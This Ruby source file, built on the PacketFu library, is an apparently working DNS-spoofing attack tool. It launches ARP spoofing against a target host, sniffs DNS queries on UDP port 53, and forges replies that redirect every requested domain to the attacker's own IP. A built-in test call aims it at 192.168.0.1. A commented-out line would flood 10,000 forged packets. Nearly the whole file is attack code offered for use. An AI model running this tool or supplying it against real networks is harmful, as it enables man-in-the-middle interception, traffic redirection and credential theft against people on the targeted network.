require 'rubygems'
require 'packetfu'

require 'arpSpoof.rb'

include PacketFu
class Sniff
        def initialize(addr, iface)
            @config = Utils.whoami?(:iface => iface)
            @iface = iface
            @targetAddr = addr
            @targetMac = Utils.arp(addr, :iface => iface)


	end
	
	def start
                thread = Thread.new { @arpSpoof = ArpSpoof.new(@config, @targetMac, @targetAddr, @iface) ; @arpSpoof.start }
                puts "WTF"
		filter = "udp and port 53"
		cap = Capture.new(:iface => $iface, :start => true, :promisc => true, \
						  :filter => filter, :save=>true)
		cap.stream.each do |p|
			@pkt = Packet.parse(p)
			#check if packet type is query
			if @pkt.payload[2]  == 1 && @pkt.payload[3]  == 0
                                @domainName = getDomainName(@pkt.payload[12..-1])
                                if @domainName.nil?
					puts "domainName nil"
					next
				end
                                puts "DNS request recieved for: #{@domainName}"
                                sendDnsResponce
			end
		end
	end

private
	def getDomainName(payload)
		domainName = ""
		while(true)
			len = payload[0].to_i
			if (len != 0)
				domainName += payload[1,len] + "."
				payload = payload[len+1..-1]
			else
				return domainName = domainName[0,domainName.length-1]
			end
		end
	end

        def sendDnsResponce()
            udp_pkt = UDPPacket.new(:config => @config, :udp_src => @pkt.udp_dst, :udp_dst => @pkt.udp_src)
            udp_pkt.eth_daddr   = @targetMac
            udp_pkt.ip_daddr    = @targetAddr
            udp_pkt.ip_saddr    = @pkt.ip_daddr
            udp_pkt.payload     = @pkt.payload[0,2]
            udp_pkt.payload     += "\x81"+"\x80"+"\x00"+"\x01"+"\x00"+"\x01"+"\00"
            udp_pkt.payload     += "\x00"+"\x00"+"\x00"

            @domainName.split('.').each do |str|
                udp_pkt.payload += str.length.chr
                udp_pkt.payload += str
            end
            udp_pkt.payload     += "\x00"+"\x00"+"\x01"+"\x00"+"\x01"+"\xc0"
            udp_pkt.payload     += "\x0c"+"\x00"+"\x01"+"\x00"+"\x01"
            #TTL
            udp_pkt.payload     += "\x00"+"\x00"+"\x02"+"\x56"
            #data length
            udp_pkt.payload     += "\x00"+"\x04"

            ipstr = @config[:ip_saddr].split('.')
            udp_pkt.payload     += [ipstr[0].to_i, ipstr[1].to_i, ipstr[2].to_i, ipstr[3].to_i].pack('C*')


            udp_pkt.recalc

            #Thread.new { 10000.times {udp_pkt.to_w(@iface) } }
            udp_pkt.to_w(@iface)
            #udp_pkt.to_f("output")
	end

end

def test
        sniff = Sniff.new("192.168.0.1", "em1")
	sniff.start
end

test
